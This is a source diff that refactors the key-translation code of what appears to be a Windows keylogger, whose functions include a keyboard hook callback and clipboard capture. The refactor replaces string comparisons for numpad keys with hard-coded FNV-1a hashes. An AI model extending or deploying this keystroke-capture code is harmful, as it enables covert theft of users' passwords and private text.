@@ -8,6 +8,7 @@
 
 //C Headers
 #include <stdio.h>
+#include <inttypes.h>
 
 // #define DEBUG 1
 
@@ -18,6 +19,8 @@
 
 #define LPSTR_SIZE 0xFF
 #define MAX_BUFLEN 5120
+#define FNV_PRIME 16777619
+#define FNV_OFFSET_BASIS 2166136261
 
 //Global variables
 HHOOK mousehook;
@@ -42,6 +45,7 @@ bool IfPrintable(char* str);
 void CheckNumpad(char* str, bool numlock, bool shortcut);
 void CheckSpecialChar(char *str);
 void GetClipboardContent();
+uint32_t hash(char* str);
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
@@ -180,7 +184,6 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
                     snprintf(tmp, LPSTR_SIZE, "[%s]", str);
                     strncpy(str, tmp, LPSTR_SIZE);
                 }
-            
                 CheckNumpad(str, numlock, shortcut);
             }
 
@@ -273,150 +276,186 @@ bool IfPrintable(char* str) {
 }
 
 void CheckNumpad(char* str, bool numlock, bool shortcut) {
-//Cause there is no known method to me to map it automatically,
-//I have to do it manually
-//Not using C++ map, bcs of binary size
+    //Cause there is no known method to me to map it automatically,
+    //I have to do it manually
+    //Not using C++ map, bcs of binary size
+    //Using hardcoded hashes, bcs it should be faster than if & strcmp
+    uint32_t hashed = hash(str);
+
     if (numlock && !shortcut) {
-        if (strcmp(str, "[Num 0]") == 0) {
+        switch (hashed) {
+            case 468635197:
             strncpy(str, "0", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 1]") == 0) {
+            break;
+
+            case 3622871496:
             strncpy(str, "1", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 2]") == 0) {
+            break;
+
+            case 3622430211:
             strncpy(str, "2", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 3]") == 0) {
+            break;
+
+            case 3689687782:
             strncpy(str, "3", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 4]") == 0) {
+            break;
+
+            case 467943649:
             strncpy(str, "4", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 5]") == 0) {
+            break;
+
+            case 400980268:
             strncpy(str, "5", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 6]") == 0) {
+            break;
+
+            case 3621738663:
             strncpy(str, "6", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 7]") == 0) {
+            break;
+
+            case 3688996234:
             strncpy(str, "7", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 8]") == 0) {
+            break;
+
+            case 3691114805:
             strncpy(str, "8", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 9]") == 0) {
+            break;
+
+            case 3624151424:
             strncpy(str, "9", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num Del]") == 0) {
+            break;
+
+            case 414182630:
             strncpy(str, "[,]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num +]") == 0) {
-            strncpy(str, "+", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num -]") == 0) {
-            strncpy(str, "-", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num *]") == 0) {
-            strncpy(str, "*", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num /]") == 0) {
-            strncpy(str, "/", LPSTR_SIZE);
+            break;
         }
     }
     else if (!shortcut) {
-        if (strcmp(str, "[Num 0]") == 0) {
+        switch (hashed) {
+            case 468635197:
             strncpy(str, "[Insert]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 1]") == 0) {
+            break;
+
+            case 3622871496:
             strncpy(str, "[End]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 2]") == 0) {
+            break;
+
+            case 3622430211:
             strncpy(str, "[Down]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 3]") == 0) {
+            break;
+
+            case 3689687782:
             strncpy(str, "[Page Down]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 4]") == 0) {
+            break;
+
+            case 467943649:
             strncpy(str, "[Left]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 5]") == 0) {
+            break;
+
+            case 400980268:
             strncpy(str, "[]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 6]") == 0) {
+            break;
+
+            case 3621738663:
             strncpy(str, "[Right]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 7]") == 0) {
+            break;
+
+            case 3688996234:
             strncpy(str, "[Home]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 8]") == 0) {
+            break;
+
+            case 3691114805:
             strncpy(str, "[Up]", LPSTR_SIZE);
-        }
-        else if (strcmp(str, "[Num 9]") == 0) {
+            break;
+
+            case 3624151424:
             strncpy(str, "[Page Up]", LPSTR_SIZE);
+            break;
         }
+    }
+
+    switch (hashed) {
+        case 472327886:
+        strncpy(str, "+", LPSTR_SIZE);
+        break;
+
+        case 3626122900:
+        strncpy(str, "-", LPSTR_SIZE);
+        break;
+
+        case 3626269995:
+        strncpy(str, "*", LPSTR_SIZE);
+        break;
+
+        case 3692939186:
+        strncpy(str, "/", LPSTR_SIZE);
+        break;
     }
 }
 
 void CheckSpecialChar(char* str) {
-//Same situation - function now available, map too big
-    if (str[0] == '1') {
+    //Same situation - function not available, map too big
+    //Numbers are hardcoded hashes, single char comparison is probably better,
+    //but I have to test it
+    // uint32_t hashed = hash(str);
+    
+    if (str[0] == '1') {            //873244444
         str[0] = '!';
     }
-    else if (str[0] == '2') {
+    else if (str[0] == '2') {       //923577301
         str[0] = '@';
     }
-    else if (str[0] == '3') {
+    else if (str[0] == '3') {       //906799682
         str[0] = '#';
     }
-    else if (str[0] == '4') {
+    else if (str[0] == '4') {       //822911587
         str[0] = '$';
     }
-    else if (str[0] == '5') {
+    else if (str[0] == '5') {       //806133968
         str[0] = '%';
     }
-    else if (str[0] == '6') {
+    else if (str[0] == '6') {       //856466825
         str[0] = '^';
     }
-    else if (str[0] == '7') {
+    else if (str[0] == '7') {       //839689206
         str[0] = '&';
     }
-    else if (str[0] == '8') {
+    else if (str[0] == '8') {       //1024243015
         str[0] = '*';
     }
-    else if (str[0] == '9') {
+    else if (str[0] == '9') {       //1007465396
         str[0] = '(';
     }
-    else if (str[0] == '0') {
+    else if (str[0] == '0') {       //890022063
         str[0] = ')';
     }
-    else if (str[0] == '-') {
+    else if (str[0] == '-') {       //671913016
         str[0] = '_';
     }
-    else if (str[0] == '=') {
+    else if (str[0] == '=') {       //940354920
         str[0] = '+';
     }
-    else if (str[0] == '[') {
+    else if (str[0] == '[') {       //3725336506
         str[0] = '{';
     }
-    else if (str[0] == ']') {
+    else if (str[0] == ']') {       //3624670792
         str[0] = '}';
     }
-    else if (str[0] == '\\') {
+    else if (str[0] == '\\') {      //3641448411
         str[0] = '|';
     }
-    else if (str[0] == ';') {
+    else if (str[0] == ';') {       //1041020634
         str[0] = ':';
     }
-    else if (str[0] == '\'') {
+    else if (str[0] == '\'') {      //571247302
         str[0] = '"';
     }
-    else if (str[0] == ',') {
+    else if (str[0] == ',') {       //688690635
         str[0] = '<';
     }
-    else if (str[0] == '.') {
+    else if (str[0] == '.') {       //72245873
         str[0] = '>';
     }
-    else if (str[0] == '/') {
+    else if (str[0] == '/') {       //705468254
         str[0] = '?';
     }
 }
@@ -455,4 +494,17 @@ void GetClipboardContent() {
 #ifdef DEBUG
     std::cout << result << "\n";
 #endif
+}
+
+uint32_t hash(char* str) {
+    //FNV-1a
+    uint32_t hash = FNV_OFFSET_BASIS;
+    int byte;
+
+    while (byte = *str++) {
+        hash ^= byte;
+        hash *= FNV_PRIME;
+    }
+
+    return hash;
 }
